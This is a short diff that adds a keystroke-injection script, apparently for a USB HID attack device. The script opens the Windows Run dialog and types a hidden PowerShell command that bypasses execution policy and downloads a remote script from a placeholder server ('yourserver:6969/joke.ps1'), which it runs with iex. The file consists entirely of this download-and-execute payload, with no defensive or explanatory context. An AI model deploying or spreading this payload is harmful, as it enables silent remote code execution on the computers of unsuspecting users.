@@ -1,0 +1,6 @@
+DELAY 500
+HOTKEY GUI R
+DELAY 300
+STRING C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -NoP -Win Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadString('http://yourserver:6969/joke.ps1') | iex""
+DELAY 300
+PRESS ENTER
